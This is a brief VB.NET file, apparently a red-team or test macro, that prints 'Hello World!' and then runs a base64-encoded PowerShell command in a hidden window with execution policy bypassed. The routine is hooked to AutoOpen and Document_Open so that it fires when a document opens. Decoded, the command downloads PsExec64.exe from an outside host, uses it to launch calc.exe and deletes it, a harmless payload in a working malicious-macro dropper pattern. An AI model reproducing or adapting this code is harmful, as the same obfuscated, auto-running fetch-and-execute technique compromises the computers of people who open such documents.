Imports System

Module Program
    Private VBA As Object = Nothing
    Sub Main(args As String())
        Console.WriteLine("Hello World!")

        mrrobot()

    End Sub

    Sub mrrobot()

        Dim darlene
        darlene = "powershell.exe -nop -win hid -exec bypass -encodedcommand JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgSW52b" _
        & "2tlLVdlYlJlcXVlc3QgLVVSSSBodHRwczovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGUgLU91dCAkZW52OnRlbXBccHNleGVjLmV4ZTsgU3RhcnQtUH" _
        & "JvY2VzcyAkZW52OnRlbXBccHNleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIiAtTm9OZXdXaW5kb3cgLVdhaXQ7IGRlbCA" _
        & "kZW52OnRlbXBccHNleGVjLmV4ZQ=="

        Dim shell
        Dim out
        shell = VBA.CreateObject("WScript.Shell")
        out = shell.Run(darlene)

    End Sub

    Sub AutoOpen()
        mrrobot()
    End Sub

    Sub Document_Open()
        mrrobot()
    End Sub

End Module
